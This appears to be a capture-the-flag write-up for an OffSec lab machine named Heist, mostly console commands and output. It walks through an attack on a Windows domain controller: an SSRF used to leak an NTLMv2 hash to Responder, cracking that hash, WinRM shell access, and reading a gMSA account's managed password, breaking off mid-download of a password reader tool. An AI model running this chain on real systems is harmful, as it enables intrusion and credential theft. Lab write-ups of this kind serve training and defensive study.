
# Recon

```console
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-25 22:56 EST
Nmap scan report for 192.168.227.165
Host is up (0.11s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-26 04:00:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49752/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 256.43 seconds
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# nmap -Pn -sT -sV -n -sC -p 53,88,135,139,445,464,593,636,3268,3269,3389,8080  192.168.227.165
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-25 23:04 EST
Nmap scan report for 192.168.227.165
Host is up (0.11s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-26 04:04:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-01-26T04:04:29+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2022-01-25T03:56:00
|_Not valid after:  2022-07-27T03:56:00
|_ssl-date: 2022-01-26T04:05:08+00:00; 0s from scanner time.
8080/tcp open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-26T04:04:33
|_  start_date: N/A

```


## SMB tcp/445

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# crackmapexec smb 192.168.227.165                                               
SMB         192.168.227.165 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
```

### Null sessions
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# smbmap -H 192.168.227.165                                                                                                               
[!] Authentication error on 192.168.227.165
                                                                                                                                                                                             
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# smbmap -H 192.168.227.165 -u ''
[!] Authentication error on 192.168.227.165

┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# smbmap -H 192.168.227.165 -u 'Guest'                                                                                                                                                 1 ⨯
[!] Authentication error on 192.168.227.165
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# smbclient -L 192.168.227.165 -N                                       
session setup failed: NT_STATUS_ACCESS_DENIED
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# rpcclient -U '' 192.168.227.165 -N 
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# rpcclient -U 'Guest' 192.168.227.165 -N                                                                                                                                              1 ⨯
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# enum4linux -a 192.168.227.165                                                                                                                                                        1 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jan 25 23:29:15 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.227.165
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================= 
|    Enumerating Workgroup/Domain on 192.168.227.165    |
 ======================================================= 
[E] Can't find workgroup/domain


 =============================================== 
|    Nbtstat Information for 192.168.227.165    |
 =============================================== 
Looking up status of 192.168.227.165
No reply from 192.168.227.165

 ======================================== 
|    Session Check on 192.168.227.165    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

## Kerberos tcp/88
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# impacket-GetADUsers -all heist.offsec/ -dc-ip 192.168.227.165
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Querying 192.168.227.165 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

## LDAP tcp/389

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# ldapsearch -x -h 192.168.227.165 -D '' -w '' -b "DC=heist,DC=offsec"                                                                                                                 1 ⨯
# extended LDIF
#
# LDAPv3
# base <DC=heist,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

## HTTP tcp/8080

### SSRF

https://infosecwriteups.com/exploiting-server-side-request-forgery-ssrf-vulnerability-faeb7ddf5d0e

https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/

https://github.com/blazeinfosec/ssrf-ntlm

https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# curl http://192.168.227.165:8080/?url=http://192.168.49.227/loquesea
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 404.
<p>Message: File not found.
<p>Error code explanation: 404 = Nothing matches the given URI.
</body>
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# python -m SimpleHTTPServer 80                                                                                                                                                        1 ⨯
Serving HTTP on 0.0.0.0 port 80 ...
192.168.227.165 - - [26/Jan/2022 00:24:50] code 404, message File not found
192.168.227.165 - - [26/Jan/2022 00:24:50] "GET /loquesea HTTP/1.1" 404 -
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# curl http://192.168.227.165:8080/?url=http://192.168.49.227                                                                                                                        130 ⨯
<img src='file://///RespProxySrv/pictures/logso.jpg' alt='Loading' height='1' width='1'>       
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# responder -I tun0 -rdw                                                                                                                                                             130 ⨯
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.49.227]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-9L27726BI0N]
    Responder Domain Name      [1WLF.LOCAL]
    Responder DCE-RPC Port     [45049]

[+] Listening for events...                                                                                                                                                                  

[HTTP] NTLMv2 Client   : 192.168.227.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:2ae0a27f0981623b:6046E7A364F70F41626A8A0C34BB3E5C:01010000000000000031CB897412D801BEB9D47C36ACC2F80000000002000800310057004C00460001001E00570049004E002D0039004C00320037003700320036004200490030004E0004001400310057004C0046002E004C004F00430041004C0003003400570049004E002D0039004C00320037003700320036004200490030004E002E00310057004C0046002E004C004F00430041004C0005001400310057004C0046002E004C004F00430041004C0008003000300000000000000000000000003000007A29A27863F5D1AD6883FE224B91C4F66E576FA3FC0AFA4D9593D7E005FAF3DB0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340039002E003200320037000000000000000000                                                                     
[*] Skipping previously captured hash for HEIST\enox
```
  
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# hashcat -O -m 5600 -a 0 hash_ssrf.txt /usr/share/wordlists/rockyou.txt -o crack_hash_ssrf.txt                                                                                      130 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 2171/2235 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1


...
...
...

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ENOX::HEIST:2ae0a27f0981623b:6046e7a364f70f41626a8a...000000
Time.Started.....: Wed Jan 26 00:54:20 2022 (11 secs)
Time.Estimated...: Wed Jan 26 00:54:31 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    65606 H/s (2.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> oooooo

Started: Wed Jan 26 00:53:47 2022
Stopped: Wed Jan 26 00:54:32 2022


┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# cat crack_hash_ssrf.txt                                                             
ENOX::HEIST:2ae0a27f0981623b:6046e7a364f70f41626a8a0c34bb3e5c:01010000000000000031cb897412d801beb9d47c36acc2f80000000002000800310057004c00460001001e00570049004e002d0039004c00320037003700320036004200490030004e0004001400310057004c0046002e004c004f00430041004c0003003400570049004e002d0039004c00320037003700320036004200490030004e002e00310057004c0046002e004c004f00430041004c0005001400310057004c0046002e004c004f00430041004c0008003000300000000000000000000000003000007a29a27863f5d1ad6883fe224b91c4f66e576fa3fc0afa4d9593d7e005faf3db0a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340039002e003200320037000000000000000000:california
```

## SMB tcp/445

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# crackmapexec smb 192.168.227.165 -u enox -p california                                  
SMB         192.168.227.165 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
SMB         192.168.227.165 445    DC01             [+] heist.offsec\enox:california 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# crackmapexec smb 192.168.227.165 -u enox -p california --shares
SMB         192.168.227.165 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:heist.offsec) (signing:True) (SMBv1:False)
SMB         192.168.227.165 445    DC01             [+] heist.offsec\enox:california 
SMB         192.168.227.165 445    DC01             [+] Enumerated shares
SMB         192.168.227.165 445    DC01             Share           Permissions     Remark
SMB         192.168.227.165 445    DC01             -----           -----------     ------
SMB         192.168.227.165 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.227.165 445    DC01             C$                              Default share
SMB         192.168.227.165 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.227.165 445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.227.165 445    DC01             SYSVOL          READ            Logon server share 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# smbclient  //192.168.227.165/SYSVOL -U "enox%california"            
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul 20 07:01:21 2021
  ..                                  D        0  Tue Jul 20 07:01:21 2021
  heist.offsec                       Dr        0  Tue Jul 20 07:01:21 2021

                7706623 blocks of size 4096. 3179688 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \heist.offsec\DfsrPrivate\*
getting file \heist.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 22 as heist.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \heist.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as heist.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \heist.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2786 as heist.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (6.7 KiloBytes/sec) (average 2.1 KiloBytes/sec)
getting file \heist.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as heist.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.5 KiloBytes/sec) (average 2.2 KiloBytes/sec)
getting file \heist.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3856 as heist.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.9 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \> exit
```                                               

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# find . -type f 2>/dev/null | xargs file | grep -v open                                                                                                                             130 ⨯
./console:                                                                                ASCII text
./heist.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol:      data
./heist.offsec/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI:                   ASCII text, with CRLF line terminators
./heist.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI:                   ASCII text, with CRLF line terminators
./crack_hash_ssrf.txt:                                                                    ASCII text, with very long lines
./hash_ssrf.txt:                                                                          ASCII text, with very long lines
./.README.md.swp:               
```

## Kerberos tcp/88 

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# impacket-GetADUsers -all  heist.offsec/enox:california -dc-ip 192.168.227.165            
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Querying 192.168.227.165 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2021-09-14 10:22:50.794225  2022-01-25 22:56:44.754441 
Guest                                                 <never>              <never>             
krbtgt                                                2021-07-20 07:02:20.922009  <never>             
enox                                                  2021-08-31 09:09:05.852884  2021-10-26 06:21:56.326817 
```

### Kerberoasting

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# impacket-GetUserSPNs 'heist.offsec/enox:california' -dc-ip 192.168.227.165
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

No entries found!
                                                                                                                                                                                             
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# 
```

### Berberoast ASREPRoast
 
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# impacket-GetNPUsers heist.offsec/ -usersfile users.txt -format john -outputfile hash.txt -dc-ip 192.168.227.165                                                                      2 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User enox doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## LDAP tcp/389

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# ldapdomaindump -u 'heist.offsec\enox' -p 'california' 192.168.227.165                                                                                                              131 ⨯
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```


## Winrm tcp/5986

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Heist]
└─# evil-winrm -i 192.168.227.165 -u enox -p california                                                                                                                                  1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enox\Documents> dir
*Evil-WinRM* PS C:\Users\enox\Documents> ls
*Evil-WinRM* PS C:\Users\enox\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\enox\Desktop> dir


    Directory: C:\Users\enox\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:12 AM                application
-a----        1/25/2022   7:56 PM             34 local.txt
-a----        5/27/2021   7:03 AM            239 todo.txt


*Evil-WinRM* PS C:\Users\enox\Desktop> type local.txt
7c89d1a25853d90c7dd612c0d7a0e8c7
```


### AD Local Enumerate

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADDomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=heist,DC=offsec
DeletedObjectsContainer            : CN=Deleted Objects,DC=heist,DC=offsec
DistinguishedName                  : DC=heist,DC=offsec
DNSRoot                            : heist.offsec
DomainControllersContainer         : OU=Domain Controllers,DC=heist,DC=offsec
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-537427935-490066102-1511301751
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=heist,DC=offsec
Forest                             : heist.offsec
InfrastructureMaster               : DC01.heist.offsec
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=heist,DC=offsec}
LostAndFoundContainer              : CN=LostAndFound,DC=heist,DC=offsec
ManagedBy                          :
Name                               : heist
NetBIOSName                        : HEIST
ObjectClass                        : domainDNS
ObjectGUID                         : 436b5635-4c3e-42a0-9b70-fdfd7666f6c4
ParentDomain                       :
PDCEmulator                        : DC01.heist.offsec
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=heist,DC=offsec
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {DC01.heist.offsec}
RIDMaster                          : DC01.heist.offsec
SubordinateReferences              : {DC=ForestDnsZones,DC=heist,DC=offsec, DC=DomainDnsZones,DC=heist,DC=offsec, CN=Configuration,DC=heist,DC=offsec}
SystemsContainer                   : CN=System,DC=heist,DC=offsec
UsersContainer                     : CN=Users,DC=heist,DC=offsec
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> (Get-ADDomain).DomainSID

BinaryLength AccountDomainSid                        Value
------------ ----------------                        -----
          24 S-1-5-21-537427935-490066102-1511301751 S-1-5-21-537427935-490066102-1511301751
```
```console
Evil-WinRM* PS C:\Users\enox\Documents> Get-ADDefaultDomainPasswordPolicy


ComplexityEnabled           : False
DistinguishedName           : DC=heist,DC=offsec
LockoutDuration             : 00:30:00
LockoutObservationWindow    : 00:30:00
LockoutThreshold            : 0
MaxPasswordAge              : 42.00:00:00
MinPasswordAge              : 1.00:00:00
MinPasswordLength           : 7
objectClass                 : {domainDNS}
objectGuid                  : 436b5635-4c3e-42a0-9b70-fdfd7666f6c4
PasswordHistoryCount        : 24
ReversibleEncryptionEnabled : False
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADForest -Identity heist.offsec


ApplicationPartitions : {DC=ForestDnsZones,DC=heist,DC=offsec, DC=DomainDnsZones,DC=heist,DC=offsec}
CrossForestReferences : {}
DomainNamingMaster    : DC01.heist.offsec
Domains               : {heist.offsec}
ForestMode            : Windows2016Forest
GlobalCatalogs        : {DC01.heist.offsec}
Name                  : heist.offsec
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=heist,DC=offsec
RootDomain            : heist.offsec
SchemaMaster          : DC01.heist.offsec
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADGroup -Filter "*" | Select 'Name'

Name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Web Admins
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADGroupMember -Identity 'Web Admins' -Recursive


distinguishedName : CN=Naqi,CN=Users,DC=heist,DC=offsec
name              : Naqi
objectClass       : user
objectGUID        : 82c847e5-1db7-4c00-8b06-882efb4efc6f
SamAccountName    : enox
SID               : S-1-5-21-537427935-490066102-1511301751-1103
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADPrincipalGroupMembership -Identity enox


distinguishedName : CN=Domain Users,CN=Users,DC=heist,DC=offsec
GroupCategory     : Security
GroupScope        : Global
name              : Domain Users
objectClass       : group
objectGUID        : 7344cdb2-deeb-4c21-8a57-b7abd9f95e91
SamAccountName    : Domain Users
SID               : S-1-5-21-537427935-490066102-1511301751-513

distinguishedName : CN=Remote Management Users,CN=Builtin,DC=heist,DC=offsec
GroupCategory     : Security
GroupScope        : DomainLocal
name              : Remote Management Users
objectClass       : group
objectGUID        : 60096391-92f3-40a6-8b5b-c35e4111ecb1
SamAccountName    : Remote Management Users
SID               : S-1-5-32-580

distinguishedName : CN=Web Admins,CN=Users,DC=heist,DC=offsec
GroupCategory     : Security
GroupScope        : Global
name              : Web Admins
objectClass       : group
objectGUID        : acc70551-400f-43bb-9847-7d818d9d3472
SamAccountName    : Web Admins
SID               : S-1-5-21-537427935-490066102-1511301751-1104
```

```console
Evil-WinRM* PS C:\Users\enox\Documents> net users /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            enox                     Guest
krbtgt
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\enox\Documents> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:25 AM                Administrator
d-----        7/20/2021   4:17 AM                enox
d-r---        5/28/2021   3:53 AM                Public
d-----        9/14/2021   8:27 AM                svc_apache$
```


```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADuser -Filter * -Properties * | select SamAccountName

SamAccountName
--------------
Administrator
Guest
krbtgt
enox
```

```console
Evil-WinRM* PS C:\Users\enox\Documents> Get-ADuser -Filter * -Properties * | select servicePrincipalName

servicePrincipalName
--------------------
{}
{}
{kadmin/changepw}
{}
```
```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADUser -Filter * -Properties * | Where {$_.ServicePrincipalName -ne $null} | Select 'Name','ServicePrincipalName'

Name   ServicePrincipalName
----   --------------------
krbtgt {kadmin/changepw}
```
```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADUser -Identity krbtgt -Properties ServicePrincipalName | select ServicePrincipalName

ServicePrincipalName
--------------------
{kadmin/changepw}

```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADServiceAccount -Filter *


DistinguishedName : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
Enabled           : True
Name              : svc_apache
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : d40bc264-0c4e-4b86-b3b9-b775995ba303
SamAccountName    : svc_apache$
SID               : S-1-5-21-537427935-490066102-1511301751-1105
UserPrincipalName :
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
```

```console
*Evil-WinRM* PS C:\Users\enox\Documents> Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'


DistinguishedName    : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
Enabled              : True
msDS-ManagedPassword : {1, 0, 0, 0...}
Name                 : svc_apache
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : d40bc264-0c4e-4b86-b3b9-b775995ba303
SamAccountName       : svc_apache$
SID                  : S-1-5-21-537427935-490066102-1511301751-1105
UserPrincipalName    :


*Evil-WinRM* PS C:\Users\enox\Documents> $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
*Evil-WinRM* PS C:\Users\enox\Documents> $mp = $gmsa.'msDS-ManagedPassword'
*Evil-WinRM* PS C:\Users\enox\Documents> $mp
....
...
18
237
20
66
202
14
0
0
```

https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe

```console
┌──(root💀kali)-[/opt/tools]
└─# wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe                                       
--2022-01-27 01:13:30--  https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://github.com/CsEnox/just-some-stuff/raw/main/GMSAPasswordReader.exe [following]
--2022-01-27 01:13:31--  https://github.com/CsEnox/just-some-stuff/raw/main/GMSAPasswordReader.exe
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/CsEnox/just-some-stuff/main/GMSAPasswordReader.exe [following]
--2022-01-27 01:13:31--  https://raw.githubusercontent.com/CsEnox/just-some-stuff/main/GMSAPasswordReader.exe
